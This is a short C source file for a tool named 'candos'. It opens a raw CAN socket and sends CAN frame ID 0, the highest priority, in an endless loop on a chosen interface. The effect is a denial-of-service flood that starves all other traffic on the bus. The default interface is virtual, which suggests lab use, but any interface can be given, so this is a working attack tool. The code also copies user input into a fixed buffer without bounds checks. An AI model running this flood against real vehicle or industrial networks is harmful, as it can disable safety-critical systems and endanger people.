#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include <linux/can.h>
#include "lib.h"

#include <string.h>
#include <stdio.h>
#include <stdbool.h>
#include <getopt.h>
#include <unistd.h>

/* At time of writing, these constants are not defined in the headers */
#ifndef PF_CAN
#define PF_CAN 29
#endif

#ifndef AF_CAN
#define AF_CAN PF_CAN
#endif

int printusage() {
    printf("Usage: candos [OPTIONS]\n");
    printf("Inject the highest priority CAN message of ID 0\n\n");
    printf("OPTIONS:\n");
    printf("    -n <ifname>     Set the interface (Default 'vcan0')\n\n");
    return -1;
}

int main(int argc, char *argv[]) {

    /* ###############################################################
     * Check cmdline arguments
     * ############################################################### */
    char interface[32] = "vcan0";

    while (true) {
        char option = getopt(argc, argv, "p:g:n:h");
        if (option == -1) break; /* end of list */
        switch (option) {
            case 'n':
                if (strcmp(interface, "vcan0") != 0) return printusage();
                strcpy(interface, optarg);
                break;
            case 'h': /* help */
            case ':': /* missing argument of a parameter */
            default:
                return printusage();
        }
    }
    /* ###############################################################
     * Create the socket
     * ############################################################### */
    int skt = socket(PF_CAN, SOCK_RAW, CAN_RAW);

    /* ###############################################################
     * Locate the interface you wish to use
     * ############################################################### */
    struct ifreq ifr;
    strcpy(ifr.ifr_name, interface);
    /* ifr.ifr_ifindex gets filled with that device's index */
    ioctl(skt, SIOCGIFINDEX, &ifr);

    /* ###############################################################
     * Select that CAN interface, and bind the socket to it.
     * ############################################################### */
    struct sockaddr_can addr;
    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;
    if (bind(skt, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        return 1;
    }
    /* canfd frame to use functions from lib.c */
    struct canfd_frame frame; /* supports classical and extended can */

    /* ###############################################################
     * Sending DoS messages
     * ############################################################### */

    /* use parsing function from can-utils lib.c */
    parse_canframe("000#0000000000000000", &frame);

    while (true) {
        /* Write message to the can bus */
        write(skt, &frame, 16);
    }

    return 0;
}